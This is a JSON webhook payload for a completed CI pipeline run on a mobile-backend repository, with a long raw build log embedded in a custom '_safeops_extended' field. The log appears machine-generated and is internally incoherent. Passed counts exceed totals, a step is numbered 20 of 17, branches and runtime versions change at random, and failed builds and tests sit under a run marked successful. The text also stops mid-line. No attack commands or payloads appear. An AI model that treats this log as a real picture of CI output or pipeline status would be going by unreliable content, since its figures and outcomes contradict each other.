{
  "action": "completed",
  "workflow_run": {
    "id": 309,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-634",
    "head_sha": "68157ba637dc264fe266938391b3370e5b285329",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-24T12:46:30.274884Z",
    "updated_at": "2025-11-24T12:49:36.838572Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nSwitched to branch 'feature/task-700'\nStep 6/18: Testing\nPlatform: linux-x64\nOptimizing 76 modules...\nUsing Python 3.11\nTest Suites: 18 passed, 39 total\nDone.\nInstalling express@1.1.7\nChecking out main branch\nCompiling utils/utils.go...\nConnection established\n[12:46:30] DEBUG: Memory usage: 1755MB\nImage pulled successfully\n[12:46:30] INFO: Processing request\nUsing Python 3.9\nCompiling lib/main.py...\nVerifying...\nUsing Python 3.9\nAlready up to date.\nyarn add: Done in 2.26s\nVerifying...\nCompiling components/service.java...\nVerifying...\nnpm notice: package.json updated\nnpm install: added 127 packages\n[12:46:30] INFO: Request completed\n[12:46:30] INFO: Cache refreshed\nPOST /upload - 200 (390ms)\nMinifying main.js\nCompiling components/handler.rs...\nOptimizing 99 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/18: Running migrations\nCompiling src/index.js...\nCache hit for key-2751\n\u2713 All checks passed\nCache saved successfully\nCache invalidated: dependencies\nPushing to registry...\nLayer 10/13: ENV command\nFetching from https://pypi.org/package.json\n[12:46:30] DEBUG: Query executed in 39ms\nInstalling jest@4.8.6\nAlready up to date.\n[12:46:30] DEBUG: Query executed in 23ms\n[12:46:30] WARN: Deprecated API usage\nPlatform: win32-x64\n\u2713 build completed\nEnvironment: staging\n[12:46:30] DEBUG: Query executed in 96ms\nCompleted.\nMinifying main.js\nCreating production build...\nStep 18/23: Building\nTransforming 951 files...\npip install: Successfully installed prettier-5.19\nCompleted.\nPOST /api - 201 (253ms)\n[12:46:30] INFO: Starting build process\nCreating production build...\nProcessing...\nAlready up to date.\nPlatform: linux-x64\nCache miss for key-5678\nCompiling lib/app.ts...\n[12:46:30] INFO: Processing request\nnpm install: resolved 1193 packages\nCache miss for key-8013\nStep 6/19: Running migrations\nFetching submodules...\npip: Installing build dependencies...\nReady.\nUsing Python 3.9\nInstalling webpack@5.7.4\n\u2713 package completed\n[12:46:30] DEBUG: Loading configuration\nHEAD is now at d82661d\n[12:46:30] INFO: Request completed\nUsing Python 3.9\nUploading artifact 'dist' (18 files)\n[12:46:30] DEBUG: Loading configuration\n\u2713 Task completed in 4452ms\nStep 17/24: Running migrations\n\u2713 Task completed in 4464ms\nArtifact downloaded: 16MB\nnpm notice: created a lockfile\nOptimizing 69 modules...\nCache miss for key-5974\n[12:46:30] INFO: Starting build process\nUsing Node.js 18.13.5\n[12:46:30] DEBUG: Loading configuration\nUploading artifact 'coverage' (36 files)\nFAILED: test_db_connect\n  PASS: test_cache_hit (378ms)\nPlatform: linux-x64\nnpm install: resolved 643 packages\nVerifying...\nHEAD is now at 5e6073c\nBundling styles.css\nAlready up to date.\nException: RuntimeError\nCache invalidated: build\nWaiting...\nCompleted.\nCache hit for key-3992\nOK\nWARNING: lodash has known vulnerabilities\nStep 13/22: Running migrations\nCoverage: 73% statements, 82% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 20MB\nPOST /data - 200 (201ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'build' (10 files)\nTransforming 647 files...\npip: Downloading lodash-2.2.tar.gz\nCompiling src/utils.go...\n[12:46:30] DEBUG: Memory usage: 1527MB\nRan 75 tests in 33s\nTests: 320 passed, 248 total\nTest Suites: 18 passed, 6 total\n\u2713 Step 'setup' succeeded\n\u2713 lint completed\nConnection established\n[12:46:30] DEBUG: Memory usage: 1334MB\nLayer 1/8: COPY command\nStep 2/21: Building\nStep 16/20: Building\nBundling main.css\nyarn add: Done in 16.73s\nMinifying vendor.js\n\u2713 Task completed in 1225ms\n[12:46:30] INFO: Processing request\nUsing Python 3.12\nnpm install: added 171 packages\nCache restored successfully (381MB)\nGenerating source maps...\nAlready up to date.\npip install: Successfully installed eslint-3.7\nArtifact uploaded: dist.zip (17MB)\nCompiling components/utils.go...\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] DEBUG: Connection pool: 10 active\n[12:46:30] DEBUG: Query executed in 19ms\nArtifact uploaded: build.tar.gz (2MB)\nCreating production build...\nOK\nException: RuntimeError\nSuccess!\nFinished.\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling main.css\nPOST /upload - 201 (247ms)\nInstalling react@5.5.0\n\u2713 deploy completed\nTransforming 455 files...\nGET /api - 201 (73ms)\nLoading...\nVerifying...\nnpm notice: package.json updated\n  PASS: test_user_create (322ms)\nHEAD is now at 06e55a3\nDone.\n  PASS: integration/test_api_health.spec.js\n[12:46:30] ERROR: Connection failed\nStep 15/17: Testing\n[12:46:30] DEBUG: Connection pool: 8 active\n[12:46:30] INFO: Connecting to database\n  PASS: e2e/test_db_connect.spec.js\nTransforming 749 files...\nCache saved successfully\nSnapshots: 10 passed, 26 total\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (50MB)\nTLS handshake completed\n  PASS: e2e/test_user_create.spec.js\nCoverage: 81% statements, 76% branches\nLoading...\nVerifying...\nSwitched to branch 'hotfix/task-178'\nnpm install: resolved 1136 packages\nSnapshots: 39 passed, 29 total\n[12:46:30] WARN: Deprecated API usage\nGenerating source maps...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nCache saved successfully\nTLS handshake completed\nnpm install: added 232 packages\nMinifying app.js\n\u2713 package completed\nStep 5/20: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/18: Testing\nGET /health - 204 (12ms)\nSwitched to branch 'hotfix/task-802'\nGET /status - 204 (44ms)\n[12:46:30] INFO: Cache refreshed\nBuilding Docker image...\nInstalling eslint@1.12.10\n[12:46:30] INFO: Cache refreshed\nRan 87 tests in 25s\nnpm install: resolved 1282 packages\nStep 16/23: Building\nCache invalidated: node_modules\nCache hit for key-9055\nCache saved successfully\nCache saved successfully\nUploading artifact 'coverage' (11 files)\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'build' succeeded\nCompiling lib/utils.go...\nFetching from https://googleapis.com/package.json\nGenerating source maps...\nUsing Python 3.9\nArtifact uploaded: build.tar.gz (40MB)\nHEAD is now at d552df7\nWARNING: lodash has known vulnerabilities\nUsing Python 3.12\nArtifact uploaded: dist.zip (38MB)\nUsing Node.js 16.18.9\nCache hit for key-3943\nSnapshots: 21 passed, 12 total\nCompleted.\n\u2717 build failed with exit code 43\nUploading artifact 'coverage' (41 files)\n=== Step lint completed ===\n=== Step: e2e_tests ===\nCache invalidated: dependencies\nArtifact downloaded: 42MB\nOptimizing 44 modules...\npip: Downloading react-1.18.tar.gz\nStep 4/24: Running migrations\n  PASS: e2e/test_db_connect.spec.js\n[12:46:30] DEBUG: Initializing service\nLoading...\nDone.\nCompiling utils/service.java...\nnpm notice: created a lockfile\nFetching from https://npmjs.org/package.json\n  PASS: test_db_connect (382ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:30] DEBUG: Memory usage: 281MB\npip install: Successfully installed lodash-3.18\nnpm notice: package.json updated\n[12:46:30] WARN: Deprecated API usage\nWaiting...\nPulling image: alpine:latest\nTests: 89 passed, 256 total\nReady.\n\u2713 All checks passed\nSuccess!\nConnection established\nOptimizing 92 modules...\nMinifying app.js\nConnection established\nCompiling src/index.js...\n[12:46:30] DEBUG: Connection pool: 6 active\nRan 42 tests in 6s\nTests: 445 passed, 370 total\nStep 3/16: Installing dependencies\n[12:46:30] DEBUG: Initializing service\nTransforming 467 files...\nSuccess!\n[12:46:30] DEBUG: Connection pool: 1 active\npip: Downloading react-5.6.tar.gz\n[12:46:30] ERROR: Connection failed\n[12:46:30] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\n\u2713 All checks passed\nnpm install: added 275 packages\n  PASS: test_user_create (229ms)\nReady.\nStep 6/23: Linting\n  PASS: unit/test_cache_hit.spec.js\nCoverage: 82% statements, 72% branches\nCompleted.\nArtifact downloaded: 11MB\npip: Installing build dependencies...\n\u2713 Task completed in 2562ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nnpm install: resolved 1497 packages\nCompleted.\nUploading artifact 'coverage' (23 files)\n[12:46:30] WARN: Deprecated API usage\nUploading artifact 'build' (20 files)\nReady.\nChecking out main branch\nOptimizing 68 modules...\nCompiling utils/utils.go...\n  PASS: test_user_create (278ms)\nnpm install: added 44 packages\nSuccess!\nPushing to registry...\nCompiling lib/service.java...\nConnection established\nBundling styles.js\nInstalling jest@5.4.7\nHEAD is now at 213f2b4\nCoverage: 72% statements, 70% branches\n[12:46:30] WARN: Deprecated API usage\nCreating production build...\nRan 17 tests in 9s\nCache miss for key-7522\nSnapshots: 7 passed, 41 total\nCache invalidated: node_modules\nCache hit for key-8257\npip install: Successfully installed react-4.4\nSnapshots: 2 passed, 18 total\nStep 15/21: Installing dependencies\nGenerating source maps...\nUploading artifact 'dist' (15 files)\nTLS handshake completed\nStep 13/18: Installing dependencies\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out main branch\nArtifact uploaded: build.tar.gz (46MB)\n[12:46:30] WARN: Deprecated API usage\nOptimizing 58 modules...\nReady.\nStep 10/19: Installing dependencies\nMinifying vendor.js\nLayer 2/10: COPY command\nArtifact uploaded: dist.zip (7MB)\nSwitched to branch 'bugfix/task-911'\nImage pulled successfully\npip install: Successfully installed webpack-3.6\npip: Installing build dependencies...\nEnvironment: staging\nSnapshots: 39 passed, 39 total\n[12:46:30] INFO: Connecting to database\nLayer 8/11: ENV command\nArtifact uploaded: dist.zip (34MB)\nPOST /data - 201 (73ms)\npip: Downloading express-2.4.tar.gz\nCompiling utils/utils.go...\n  PASS: unit/test_db_connect.spec.js\nnpm notice: created a lockfile\nReady.\npip: Collecting prettier\n[12:46:30] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching from https://github.com/package.json\nDone.\nTest Suites: 22 passed, 45 total\n[12:46:30] INFO: Request completed\nFAILED: test_db_connect\nCompiling utils/app.ts...\nOptimizing 29 modules...\nCompleted.\n[12:46:30] INFO: Request completed\nImage pulled successfully\nStep 14/24: Deploying\nCoverage: 77% statements, 94% branches\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at fb8189a\nPlatform: linux-x64\nPushing to registry...\nCompiling src/app.ts...\nUsing Node.js 20.12.8\nArtifact uploaded: dist.zip (46MB)\n\u2713 Step 'install' succeeded\nFinished.\nnpm install: resolved 1753 packages\nCompleted.\n[12:46:30] DEBUG: Loading configuration\nNODE_ENV=production\nSwitched to branch 'feature/task-467'\nPulling image: python:latest\nUploading artifact 'coverage' (23 files)\nProcessing...\nMinifying vendor.js\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nChecking out main branch\nnpm install: added 283 packages\npip: Downloading webpack-4.19.tar.gz\n[12:46:30] INFO: Processing request\nCache hit for key-1734\nGET /health - 200 (91ms)\nTime: 38.102s\nLoading...\nnpm notice: package.json updated\n[12:46:30] DEBUG: Initializing service\n[12:46:30] INFO: Connecting to database\npip install: Successfully installed express-1.6\nBuilding Docker image...\n[12:46:30] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 4/19: Running migrations\nFetching submodules...\nAlready up to date.\nCache miss for key-9163\nLoading...\nProcessing...\nVerifying...\nyarn add: Done in 13.64s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 1708 packages\n  PASS: test_user_create (292ms)\n\u2713 Step 'test' succeeded\nTransforming 840 files...\nCache hit for key-6617\nStep 14/19: Running migrations\nPushing to registry...\n\u2713 All checks passed\nRan 172 tests in 47s\n[12:46:30] DEBUG: Connection pool: 11 active\nArtifact uploaded: dist.zip (6MB)\nFetching submodules...\nChecking out develop branch\nnpm install: resolved 1928 packages\nImage pulled successfully\n[12:46:30] DEBUG: Connection pool: 16 active\n  PASS: test_auth_login (331ms)\n[12:46:30] DEBUG: Loading configuration\n[12:46:30] DEBUG: Loading configuration\nStep 19/23: Installing dependencies\nPlatform: linux-x64\npip: Installing build dependencies...\nLayer 6/14: RUN command\nyarn add: Done in 2.88s\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nUploading artifact 'build' (41 files)\n[12:46:30] DEBUG: Query executed in 39ms\n[12:46:30] INFO: Request completed\n\u2713 Step 'setup' succeeded\n[12:46:30] DEBUG: Memory usage: 786MB\nConnection established\nCache restored successfully (318MB)\nStep 19/20: Testing\nStep 17/18: Installing dependencies\n[12:46:30] WARN: Deprecated API usage\nFinished.\nCache invalidated: node_modules\nTransforming 653 files...\nRan 132 tests in 37s\nLoading...\npip install: Successfully installed prettier-2.1\n  PASS: integration/test_user_create.spec.js\n\u2713 package completed\n[12:46:30] INFO: Request completed\n[12:46:30] ERROR: Connection failed\nPushing to registry...\n[12:46:30] DEBUG: Memory usage: 1873MB\nnpm notice: package.json updated\nChecking out main branch\nTest Suites: 42 passed, 21 total\nSwitched to branch 'bugfix/task-974'\nGET /health - 201 (6ms)\nAlready up to date.\nStep 18/23: Linting\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nnpm install: resolved 235 packages\nPushing to registry...\nFetching submodules...\nMinifying main.js\nDone.\nTest Suites: 14 passed, 17 total\n[12:46:30] INFO: Processing request\nNODE_ENV=development\nTime: 46.910s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 15.17.1\n[12:46:30] DEBUG: Memory usage: 287MB\nNODE_ENV=production\nException: NullPointerException\nOK\nTime: 39.752s\nHEAD is now at 517959a\npip: Collecting eslint\nCompiling utils/app.ts...\n\u2713 test completed\nCache saved successfully\nArtifact uploaded: dist.zip (51MB)\nArtifact uploaded: build.tar.gz (49MB)\nCache saved successfully\nProcessing...\nWARNING: prettier has known vulnerabilities\nCreating production build...\nException: TypeError\nLayer 7/11: ENV command\nPOST /data - 200 (188ms)\nnpm notice: package.json updated\nStep 19/21: Deploying\nStep 6/19: Testing\nCache hit for key-9634\n\u2713 All checks passed\nStep 7/16: Running migrations\nArtifact downloaded: 40MB\nVerifying...\n[12:46:30] INFO: Request completed\nException: RuntimeError\nOptimizing 44 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:30] DEBUG: Loading configuration\nTest Suites: 26 passed, 32 total\nDone.\nCache miss for key-8851\nGET /api - 200 (53ms)\npip: Installing build dependencies...\nVerifying...\nHEAD is now at dfff783\nInstalling eslint@4.1.6\nVerifying...\nArtifact downloaded: 40MB\n[12:46:30] DEBUG: Query executed in 60ms\nChecking out develop branch\nTest Suites: 38 passed, 30 total\nnpm notice: created a lockfile\nInstalling lodash@4.11.9\nFetching submodules...\nUsing Node.js 14.1.6\nLayer 2/15: ENV command\n[12:46:30] DEBUG: Loading configuration\nPushing to registry...\n\u2713 Task completed in 2729ms\nCache restored successfully (313MB)\nCreating production build...\nGET /health - 200 (91ms)\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/utils.go...\npip: Downloading lodash-2.20.tar.gz\n[12:46:30] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-929'\nPOST /upload - 201 (265ms)\nStep 4/20: Testing\npip install: Successfully installed webpack-4.17\n[12:46:30] INFO: Processing request\n\u2717 build failed with exit code 115\nnpm notice: package.json updated\n[12:46:30] INFO: Request completed\nOptimizing 51 modules...\nGET /api - 200 (10ms)\n[12:46:30] INFO: Connecting to database\nUsing Python 3.9\nStep 18/23: Installing dependencies\nnpm notice: created a lockfile\n  PASS: e2e/test_db_connect.spec.js\nyarn add: Done in 26.83s\nInstalling axios@1.4.10\n  PASS: test_cache_hit (158ms)\nCompiling utils/handler.rs...\nGenerating source maps...\n[12:46:30] WARN: Deprecated API usage\nTransforming 457 files...\npip: Collecting lodash\nTLS handshake completed\nStep 15/19: Installing dependencies\nStep 16/22: Installing dependencies\nCache restored successfully (469MB)\n[12:46:30] INFO: Processing request\n\u2713 Step 'test' succeeded\nWARNING: webpack has known vulnerabilities\n  PASS: test_user_create (195ms)\nDone.\n[12:46:30] DEBUG: Query executed in 2ms\nAlready up to date.\npip: Downloading jest-2.13.tar.gz\nImage pulled successfully\n[12:46:30] INFO: Starting build process\nCache miss for key-2384\n[12:46:30] INFO: Connecting to database\nCache restored successfully (81MB)\nSwitched to branch 'bugfix/task-957'\nTests: 489 passed, 143 total\nStep 8/16: Testing\npip: Downloading jest-3.5.tar.gz\nTest Suites: 28 passed, 43 total\n\u2713 lint completed\nReady.\nStep 14/23: Testing\n[12:46:30] INFO: Cache refreshed\nReady.\nOK\nHEAD is now at 779f6fe\npip: Collecting axios\nTests: 411 passed, 118 total\nCompleted.\nnpm notice: created a lockfile\nGenerating source maps...\n[12:46:30] WARN: Deprecated API usage\nGenerating source maps...\n\u2713 Task completed in 3990ms\nMinifying vendor.js\nCache miss for key-1872\nOptimizing 36 modules...\nBuilding Docker image...\nPushing to registry...\nCompiling utils/handler.rs...\n[12:46:30] DEBUG: Connection pool: 16 active\nEnvironment: development\nnpm notice: created a lockfile\nConnection established\nVerifying...\nPushing to registry...\n\u2713 Step 'checkout' succeeded\nPOST /api - 201 (301ms)\n[12:46:30] INFO: Processing request\nOK\nCache miss for key-6908\nPulling image: python:latest\nArtifact downloaded: 6MB\nTest Suites: 26 passed, 36 total\nHEAD is now at 2595505\n\u2713 lint completed\nRan 200 tests in 39s\nCoverage: 78% statements, 63% branches\n[12:46:30] INFO: Processing request\n  PASS: test_auth_login (252ms)\nStep 10/15: Installing dependencies\nTime: 58.208s\n[12:46:30] INFO: Starting build process\nOK\nConnection established\nCompleted.\nCompiling lib/service.java...\nGET /status - 201 (32ms)\nSnapshots: 45 passed, 3 total\n[12:46:30] DEBUG: Loading configuration\n[12:46:30] INFO: Connecting to database\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] WARN: Deprecated API usage\npip: Downloading prettier-4.19.tar.gz\nUploading artifact 'build' (46 files)\nTest Suites: 25 passed, 20 total\nTLS handshake completed\nCompiling utils/app.ts...\nConnection established\nUploading artifact 'coverage' (16 files)\n[12:46:30] DEBUG: Connection pool: 20 active\nCompiling src/handler.rs...\nStep 5/17: Deploying\nGET /status - 200 (30ms)\nCache restored successfully (453MB)\nConnection established\n[12:46:30] INFO: Connecting to database\n  PASS: test_db_connect (289ms)\nCache hit for key-1332\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nCompiling utils/app.ts...\nTest Suites: 19 passed, 41 total\nTests: 357 passed, 260 total\nGET /health - 200 (90ms)\nCoverage: 85% statements, 69% branches\nCache hit for key-2596\npip install: Successfully installed eslint-1.9\nWARNING: webpack has known vulnerabilities\nInstalling axios@3.3.2\nCompleted.\nnpm install: resolved 1500 packages\nUsing Node.js 14.2.5\n[12:46:30] INFO: Starting build process\npip install: Successfully installed express-4.20\nLoading...\nLoading...\nHEAD is now at d68bcd1\nPulling image: node:latest\nArtifact downloaded: 6MB\nStep 11/16: Installing dependencies\n[12:46:30] DEBUG: Connection pool: 8 active\nImage pulled successfully\nCompiling lib/main.py...\nOK\n[12:46:30] INFO: Processing request\n\u2717 build failed with exit code 68\nPulling image: python:3.11\n\u2713 Task completed in 2997ms\nMinifying app.js\nHEAD is now at 4281cc0\nWARNING: prettier has known vulnerabilities\n[12:46:30] INFO: Starting build process\nChecking out main branch\n  PASS: test_user_create (468ms)\nyarn add: Done in 30.66s\nWaiting...\nStep 8/23: Linting\nTime: 114.972s\nUsing Python 3.10\nnpm install: resolved 1204 packages\n=== Step type_check completed ===\n=== Step: restore_cache ===\nCache hit for key-4342\nUsing Python 3.11\nCache invalidated: build\nGET /api - 204 (17ms)\nStep 11/20: Deploying\nEnvironment: test\n[12:46:30] DEBUG: Connection pool: 6 active\nGenerating source maps...\nLoading...\nCoverage: 84% statements, 78% branches\nStep 17/21: Deploying\nStep 8/25: Deploying\nCompleted.\nFetching submodules...\nWARNING: axios has known vulnerabilities\npip install: Successfully installed lodash-1.15\nTest Suites: 44 passed, 17 total\nCoverage: 78% statements, 92% branches\nWaiting...\n[12:46:30] INFO: Starting build process\nRan 64 tests in 12s\nEnvironment: test\n\u2713 All checks passed\n[12:46:30] INFO: Connecting to database\nCompiling src/service.java...\nBundling runtime.js\n[12:46:30] WARN: Deprecated API usage\nTests: 151 passed, 348 total\nChecking out develop branch\n  PASS: e2e/test_api_health.spec.js\nUsing Python 3.11\nNODE_ENV=development\nnpm install: resolved 367 packages\nyarn add: Done in 24.98s\nUsing Node.js 17.17.9\n[12:46:30] WARN: Deprecated API usage\nPulling image: python:3.11\n\u2717 build failed with exit code 48\nnpm notice: package.json updated\nCache miss for key-9802\nUsing Node.js 19.16.5\nTest Suites: 43 passed, 32 total\n  PASS: test_auth_login (303ms)\nCompiling components/main.py...\nPOST /api - 202 (114ms)\nEnvironment: staging\nWARNING: jest has known vulnerabilities\nOK\nPushing to registry...\n[12:46:30] INFO: Request completed\nTest Suites: 8 passed, 20 total\nAlready up to date.\nSnapshots: 15 passed, 29 total\n\u2713 lint completed\nImage pulled successfully\nCompiling lib/index.js...\nnpm notice: package.json updated\nnpm notice: package.json updated\nGenerating source maps...\nnpm install: resolved 288 packages\nNODE_ENV=production\nTime: 13.299s\nVerifying...\nBundling styles.js\nBundling styles.js\n[12:46:30] ERROR: Connection failed\nProcessing...\nPulling image: alpine:18\nDone.\nTLS handshake completed\n[12:46:30] WARN: Deprecated API usage\nCompiling components/service.java...\nLoading...\nArtifact uploaded: dist.zip (33MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nTime: 98.259s\nUsing Python 3.9\nUploading artifact 'coverage' (45 files)\nCompiling utils/utils.go...\nSnapshots: 46 passed, 20 total\n[12:46:30] INFO: Request completed\nLoading...\nCompiling components/handler.rs...\nCache hit for key-2889\nNODE_ENV=development\n[12:46:30] ERROR: Connection failed\nOK\nUploading artifact 'build' (21 files)\nTests: 499 passed, 265 total\nSnapshots: 32 passed, 40 total\nException: TypeError\nHEAD is now at c4d554a\nnpm install: added 256 packages\n[12:46:30] INFO: Connecting to database\n[12:46:30] INFO: Starting build process\nReady.\nPulling image: node:latest\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (40MB)\nCompiling components/handler.rs...\nPulling image: alpine:18\n[12:46:30] WARN: Deprecated API usage\nLoading...\nTLS handshake completed\nAlready up to date.\n[12:46:30] DEBUG: Memory usage: 1137MB\nLayer 7/13: RUN command\nFAILED: test_cache_hit\nTLS handshake completed\npip install: Successfully installed eslint-2.9\npip: Installing build dependencies...\nFAILED: test_user_create\npip: Installing build dependencies...\npip: Downloading eslint-5.1.tar.gz\nVerifying...\npip: Collecting jest\nTest Suites: 20 passed, 5 total\nPushing to registry...\nArtifact downloaded: 33MB\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching from https://docker.io/package.json\nHEAD is now at 27ddae4\nException: TypeError\nPlatform: linux-x64\nCompiling utils/app.ts...\nPulling image: alpine:18\nSnapshots: 48 passed, 47 total\nUploading artifact 'dist' (16 files)\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (82MB)\nCompleted.\nGenerating source maps...\nCompleted.\nStep 13/16: Running migrations\nPOST /api - 200 (292ms)\nEnvironment: staging\nWARNING: jest has known vulnerabilities\nCache invalidated: node_modules\nTests: 494 passed, 424 total\nCache invalidated: node_modules\nArtifact downloaded: 17MB\nPOST /api - 200 (56ms)\nCache saved successfully\nStep 10/25: Building\nStep 5/25: Linting\n[12:46:30] DEBUG: Memory usage: 863MB\n[12:46:30] DEBUG: Query executed in 24ms\n[12:46:30] DEBUG: Memory usage: 835MB\nPulling image: alpine:18\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\n[12:46:30] INFO: Starting build process\nnpm notice: created a lockfile\nStep 2/17: Building\n\u2713 deploy completed\nStep 13/15: Deploying\nArtifact uploaded: dist.zip (99MB)\nDone.\nLayer 4/10: ENV command\nArtifact downloaded: 38MB\nUsing Node.js 15.15.1\nWARNING: express has known vulnerabilities\nBuilding Docker image...\n[12:46:30] INFO: Processing request\nGET /api - 201 (83ms)\nPulling image: python:3.11\nnpm notice: created a lockfile\nReady.\nRan 42 tests in 15s\nLayer 2/12: ENV command\nStep 1/20: Linting\n[12:46:30] DEBUG: Connection pool: 6 active\nFAILED: test_user_create\nProcessing...\nLoading...\nStep 20/17: Linting\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (20MB)\nPlatform: darwin-arm64\nCache miss for key-3177\nLayer 8/11: ENV command\n  PASS: test_api_health (413ms)\n[12:46:30] DEBUG: Query executed in 50ms\nTransforming 694 files...\nStep 4/19: Building\n[12:46:30] DEBUG: Memory usage: 599MB\nCompiling components/handler.rs...\nUsing Node.js 14.2.4\nTransforming 446 files...\nyarn add: Done in 23.86s\nLoading...\nProcessing...\nStep 17/22: Running migrations\nBuilding Docker image...\nFetching from https://docker.io/package.json\n\u2713 Step 'build' succeeded\nInstalling prettier@1.15.6\nTime: 38.174s\n[12:46:30] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (91MB)\nnpm install: added 479 packages\nPulling image: node:latest\n  PASS: test_cache_hit (224ms)\nCompiling lib/index.js...\nReady.\nOK\nnpm notice: created a lockfile\nStep 5/21: Building\nProcessing...\n[12:46:30] DEBUG: Memory usage: 1239MB\nMinifying main.js\nSuccess!\nCache hit for key-7299\nRan 23 tests in 19s\nWARNING: jest has known vulnerabilities\n[12:46:30] DEBUG: Loading configuration\nPushing to registry...\n[12:46:30] INFO: Connecting to database\nnpm notice: created a lockfile\nPOST /upload - 200 (440ms)\n[12:46:30] ERROR: Connection failed\nFAILED: test_user_create\nSwitched to branch 'feature/task-197'\nStep 6/21: Installing dependencies\nFAILED: test_user_create\nnpm install: added 461 packages\n=== Step restore_cache completed ===\n=== Step: setup_node ===\nLayer 2/12: ENV command\n\u2713 validate completed\nOK\nGET /api - 204 (93ms)\nFAILED: test_auth_login\n  PASS: integration/test_auth_login.spec.js\n[12:46:30] WARN: Deprecated API usage\nInstalling express@4.19.10\nStep 18/21: Running migrations\nReady.\nTransforming 499 files...\n\u2713 All checks passed\nChecking out main branch\nSnapshots: 20 passed, 13 total\n[12:46:30] ERROR: Connection failed\n[12:46:30] INFO: Cache refreshed\n[12:46:30] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (23MB)\nChecking out main branch\nMinifying main.js\npip: Installing build dependencies...\nPushing to registry...\npip: Installing build dependencies...\nStep 13/18: Testing\nOK\n  PASS: e2e/test_db_connect.spec.js\n  PASS: test_user_create (248ms)\nPlatform: linux-x64\nnpm notice: package.json updated\nCoverage: 94% statements, 75% branches\nOK\nFetching from https://npmjs.org/package.json\n  PASS: integration/test_user_create.spec.js\nDone.\nArtifact downloaded: 16MB\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] DEBUG: Memory usage: 1892MB\nReady.\npip: Collecting webpack\nProcessing...\nChecking out develop branch\n[12:46:30] INFO: Cache refreshed\nFetching submodules...\nWaiting...\nSuccess!\npip: Installing build dependencies...\nVerifying...\nArtifact uploaded: dist.zip (19MB)\nPulling image: node:3.11\nStep 3/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\nOptimizing 41 modules...\nCompiling src/handler.rs...\nFAILED: test_db_connect\nWaiting...\nBundling vendor.js\nVerifying...\nFetching submodules...\nSnapshots: 10 passed, 25 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\n\u2713 test completed\nCompiling components/index.js...\n[12:46:30] WARN: Deprecated API usage\nCompleted.\nLoading...\nTime: 41.443s\nSwitched to branch 'bugfix/task-270'\n[12:46:30] INFO: Processing request\nGenerating source maps...\n  PASS: test_api_health (220ms)\nStep 16/21: Installing dependencies\nnpm install: resolved 1203 packages\nStep 9/25: Deploying\nArtifact uploaded: build.tar.gz (6MB)\nSwitched to branch 'hotfix/task-375'\nPOST /upload - 201 (50ms)\nCompleted.\nMinifying app.js\nOK\nSuccess!\n[12:46:30] DEBUG: Initializing service\nCreating production build...\nSwitched to branch 'hotfix/task-134'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: test\nVerifying...\nnpm install: resolved 1620 packages\nWARNING: express has known vulnerabilities\nTest Suites: 16 passed, 14 total\nUploading artifact 'build' (38 files)\npip install: Successfully installed lodash-1.12\n  PASS: unit/test_api_health.spec.js\nCompiling src/utils.go...\nnpm install: added 54 packages\n[12:46:30] DEBUG: Query executed in 49ms\nPulling image: alpine:latest\nStep 14/21: Testing\nCompiling components/app.ts...\n[12:46:30] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\n[12:46:30] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (50MB)\nSwitched to branch 'bugfix/task-156'\nPOST /upload - 202 (441ms)\n\u2713 validate completed\nGenerating source maps...\nFetching from https://docker.io/package.json\n[12:46:30] INFO: Connecting to database\nnpm install: resolved 1061 packages\nnpm notice: created a lockfile\n\u2713 deploy completed\nStep 17/17: Testing\nBuilding Docker image...\n[12:46:30] DEBUG: Connection pool: 13 active\n\u2713 lint completed\n\u26a0 